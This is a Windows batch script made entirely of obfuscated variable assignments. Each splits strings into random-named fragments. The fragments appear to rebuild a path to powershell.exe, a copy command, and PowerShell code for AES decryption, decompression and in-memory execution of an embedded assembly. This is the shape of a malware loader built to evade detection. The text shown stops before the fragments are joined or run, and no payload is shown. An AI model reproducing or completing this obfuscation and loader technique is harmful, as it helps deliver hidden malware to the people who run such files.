@echo off
set "QrnFevSUkK=32"
set "flLoWCXSNK=Wi"
set "xvFBXjBtUy=s\"
set "NvumabNBiT=:\"
set "hJPGTAASIq=\v"
set "BqvLTEyUmS=rs"
set "lTNRDiIoUY=we"
set "uMRMWSYaKk=\W"
set "HahYAStSIu=Po"
set "BhNuwnbiBH=he"
set "zHAtYhdnpI=Sy"
set "dNgVQRfylX=ll"
set "DOAbJyzcpx=xe"
set "csoiSxahvl=ow"
set "UctLfPXKFu=ws"
set "aFsgWrLieD=nd"
set "AgzoqjDmqh=rS"
set "CPxBmFaRjM=em"
set "pFwFRMXDvz=st"
set "DzigjbpChW=ll"
set "vPgPsNkAUc= /"
set "zZJoPkleGT=y "
set "dClVubYtfo=0\"
set "drWINDGtAv=.e"
set "ogBBJMzZgw=1."
set "hmeDSXrRAv=do"
set "GmxMKwXHww=we"
set "FtZfZCHsgF=co"
set "TvtvnlWNuc=py"
set "vnIRbwzoeY= C"
set "mXXvWJjYhs=in"
set "TbftabJMTl=po"
set "LztNLhefdZ=he"
set "GMXPhjumyo=cd"
set "RWMzNkALyh= %~dp0"
set "sGEOVYznqi=tS46"
set "CdHwqkLdPR=flec"
set "whNTMlefQv=('Tg"
set "BrhJnTzexZ=-joi"
set "lrihcTYZhY=oArr"
set "iOQznqGJTW=.Cre"
set "EnFVXTzypu=.Dis"
set "ppIeqBaIxP=ress"
set "fcTzAnwrRF=..-1"
set "oqHcRmKMUQ=ne);"
set "aauBaAELdN=grap"
set "WDuuyzpfUt=] -j"
set "MXFpJtUMFs=yTo("
set "iVONHFWdEZ=m.IO"
set "TnmIfRSnbG= = $"
set "hwHxyCIsGr=hy.A"
set "yiRrGOcwjf=ecry"
set "LoyPeZqztR=1] -"
set "UFoaEgfKQY=-Obj"
set "vAwhczYQKK=();$"
set "lklqwhnFlJ=se()"
set "InCeLuykHk=join"
set "kbKUhzRtgW=DVRP"
set "SRDvVcNlbx=ing("
set "wRMVwUMGVJ=; };"
set "cdqnYMcONu=TllA"
set "rtRphfJyyW=S46e"
set "AMPCvJpuMf=106u"
set "oSOBpKXryo=:('g"
set "MXQGzlkfcU=$LWH"
set "zeYeVRIHaV=.Mod"
set "CpsmlZTJGN=[Sys"
set "oCMSkBRsxr=$vNG"
set "UgRKsHpJoz=yste"
set "BgJTlXMJph=$NOp"
set "BLcFgEmYgP=[IO."
set "ULzCQjuqHX=fore"
set "uKINSXMInU=PKCS"
set "TUYjnjLIYO=Syst"
set "FNhtPUFQqE=F = "
set "RjLsUtlbJO=tem."
set "NzqRGJUVkF=tem."
set "qkqvFIxbiu=am;$"
set "KaLmqSwaVp=oL'["
set "KbgKqGqsQo=ct S"
set "gpclBZcxwE=:: '"
set "ojyHQVxfjI=WtcM"
set "DkTuDAXZef=);$v"
set "OlxWaTUMmX=O.Me"
set "AkeOvdtjsw=urit"
set "PlLyFbASno=aV.T"
set "SCXuOSUzEC=ion."
set "RelZslHZTJ=ptog"
set "feJGyytfiM=YaI "
set "svgkSJjCar=onve"
set "FzzHUDqEzs=Disp"
set "ZCRalHYKgX=Star"
set "HHKgvOqPfT=gth)"
set "GHyLQCXCrh=ode]"
set "vxLcdpTvAM=Stre"
set "gckvPfxzWr=6esa"
set "ykfFFDiLgz=d;$a"
set "zjuhGFMyPV=Invo"
set "wJUXFqzuSK=Q = "
set "ZzlzGKGGmC=New-"
set "nUYxlAFung=ddin"
set "dEnpcFAcFb=ispo"
set "WGshTAgcnj=Comp"
set "OqPDuRgcFj=L4Yi"
